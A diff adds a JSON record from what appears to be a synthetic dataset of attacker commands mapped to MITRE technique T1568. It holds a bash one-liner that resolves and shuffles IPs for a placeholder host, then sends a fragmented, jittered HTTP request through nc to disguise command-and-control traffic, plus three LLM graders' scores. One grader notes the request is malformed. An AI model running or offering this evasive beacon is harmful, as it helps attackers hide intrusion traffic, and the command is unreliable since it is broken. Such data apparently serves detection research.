@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"host=update-assets.example.com; ips=$(dig +short \\\"$host\\\" A); ua=\\\"Mozilla/5.0 (X11; Ubuntu) AppleWebKit/537.36\\\"; req=$(printf 'GET /analytics.js HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nAccept: */*\\r\\nConnection: close\\r\\n\\r\\n' \\\"$host\\\" \\\"$ua\\\"); for ip in $(printf '%s\\n' \\\"$ips\\\" | shuf); do printf '%s' \\\"$req\\\" | fold -w 20 | while read -r chunk; do printf '%s' \\\"$chunk\\\"; sleep 0.$((RANDOM%5+1)); done | nc -w 5 \\\"$ip\\\" 80 && break; sleep $((RANDOM%3+1)); done\"",
+  "explanation": "Implements fast flux by shuffling through multiple A records for a domain, fragmenting the HTTP request and adding timing jitter to evade traffic analysis while mimicking a request for analytics.js.",
+  "rationale_steps": [
+    "Query multiple A records to leverage fast-flux style dynamic resolution.",
+    "Randomize IP selection at runtime for resiliency.",
+    "Mimic normal HTTP traffic (analytics.js) with realistic headers.",
+    "Fragment the request and add delays to complicate analysis."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-1d90a008",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and appropriate escape sequences throughout the complex bash script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the dynamic resolution technique by resolving multiple IP addresses for a domain, shuffling them, and implementing timing variations and request fragmentation to evade detection while establishing command and control communication.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:10:02.471568Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, exhibiting balanced quoting, proper use of command separators, valid flag formats for all utilities, and correct arithmetic/command substitutions.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully achieves its claimed intent by dynamically resolving a domain's A records, shuffling them to implement fast-flux client-side, and using request fragmentation and timing jitter with `nc` to evade traffic analysis, perfectly aligning with T1568.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T05:10:15.678650Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting, proper separators, valid options, and correctly nested pipelines/loops make it well-formed and runnable.",
+        "semantic_score": 4,
+        "semantic_justification": "It dynamically resolves and rotates A-record endpoints and adds jittered fragmentation consistent with T1568 behaviors, but the fold|read pipeline removes LF from CRLF (malforming the HTTP request) and the \u2018fast-flux\u2019 aspect is only emulated client-side.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:11:32.073318Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
